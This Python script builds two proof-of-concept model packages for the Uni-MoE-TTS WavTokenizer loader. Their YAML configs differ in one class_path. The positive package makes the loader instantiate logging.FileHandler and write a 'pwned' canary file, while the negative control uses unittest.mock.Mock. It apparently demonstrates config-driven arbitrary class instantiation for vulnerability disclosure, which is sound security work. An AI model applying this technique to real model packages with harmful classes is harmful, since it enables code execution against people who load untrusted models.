"""Generate the Uni-MoE-TTS WavTokenizer model packages used in the PoC.

Two packages are produced; they are identical except for ONE leaf of the YAML:

  model.init_args.feature_extractor.class_path

  model_pkg_positive  ->  logging.FileHandler   (stdlib class, opens/creates a file
                                                at the path given in init_args)
  model_pkg_negative  ->  unittest.mock.Mock    (stdlib class, absorbs the same
                                                init_args as attributes, creates nothing)

Both packages contain the same two fixed file names that Uni-MoE-TTS
inference/infer_utils.py:load_all_models() joins onto the model directory:

  wavtokenizer_smalldata_frame40_3s_nq1_code4096_dim512_kmeans200_attn.yaml
  wavtokenizer_large_unify_600_24k.ckpt

The .ckpt is byte-identical in both packages: a torch checkpoint whose
"state_dict" is EMPTY. It is later loaded by from_pretrained0802 with
weights_only=True, so the checkpoint is deliberately NOT the attack vector.
There is no .py file, no native library, and no shell sidecar in either package.
"""

import hashlib
import shutil
from pathlib import Path

import torch
import yaml

HERE = Path(__file__).resolve().parent

CANARY_NAME = "pwned_unimoetts_canary.txt"

BASELINE_YAML = {
    "model": {
        "class_path": "decoder.pretrained.WavTokenizer",
        "init_args": {
            "feature_extractor": {
                # the single leaf that differs between the two arms
                "class_path": None,  # filled below
                "init_args": {
                    "filename": CANARY_NAME,
                    "mode": "a",
                    "delay": False,
                },
            },
            "backbone": {
                "class_path": "decoder.models.VocosBackbone",
                "init_args": {
                    "input_channels": 128,
                    "dim": 512,
                    "intermediate_dim": 1536,
                    "num_layers": 8,
                },
            },
            "head": {
                "class_path": "decoder.heads.ISTFTHead",
                "init_args": {
                    "dim": 512,
                    "n_fft": 1024,
                    "hop_length": 240,
                    "padding": "same",
                },
            },
        },
    }
}

POSITIVE_CLASS_PATH = "logging.FileHandler"
NEGATIVE_CLASS_PATH = "unittest.mock.Mock"

YAML_NAME = "wavtokenizer_smalldata_frame40_3s_nq1_code4096_dim512_kmeans200_attn.yaml"
CKPT_NAME = "wavtokenizer_large_unify_600_24k.ckpt"


def sha256(path: Path) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def write_yaml(package: Path, class_path: str):
    cfg = yaml.safe_load(yaml.safe_dump(BASELINE_YAML))
    cfg["model"]["init_args"]["feature_extractor"]["class_path"] = class_path
    with open(package / YAML_NAME, "w", encoding="utf-8") as f:
        yaml.safe_dump(cfg, f, sort_keys=False)


def main():
    pos = HERE / "model_pkg_positive"
    neg = HERE / "model_pkg_negative"
    for d in (pos, neg):
        if d.exists():
            shutil.rmtree(d)
        d.mkdir(parents=True)

    # one checkpoint, copied to both arms -> byte-identical, empty state_dict
    tmp_ckpt = HERE / "_empty_state_dict.ckpt"
    torch.save({"state_dict": {}}, tmp_ckpt)
    shutil.copyfile(tmp_ckpt, pos / CKPT_NAME)
    shutil.copyfile(tmp_ckpt, neg / CKPT_NAME)
    tmp_ckpt.unlink()

    write_yaml(pos, POSITIVE_CLASS_PATH)
    write_yaml(neg, NEGATIVE_CLASS_PATH)

    sums_path = HERE / "SHA256SUMS.txt"
    lines = []
    for pkg in (pos, neg):
        for name in sorted(p.name for p in pkg.iterdir()):
            p = pkg / name
            lines.append(f"{sha256(p)}  {pkg.name}/{name}")
    sums_path.write_text("\n".join(lines) + "\n", encoding="utf-8")

    print("model packages written:")
    for pkg in (pos, neg):
        print(f"  {pkg.name}/")
        for p in sorted(pkg.iterdir()):
            print(f"    {p.name}  ({p.stat().st_size} bytes)")
    print("\nSHA256 (see SHA256SUMS.txt):")
    for line in lines:
        print(f"  {line}")

    print("\nsingle-leaf diff between the two YAMLs:")
    print(f"  model.init_args.feature_extractor.class_path:")
    print(f"    positive: {POSITIVE_CLASS_PATH}")
    print(f"    negative: {NEGATIVE_CLASS_PATH}")
    print("  (everything else, including the checkpoint bytes, is identical)")


if __name__ == "__main__":
    main()
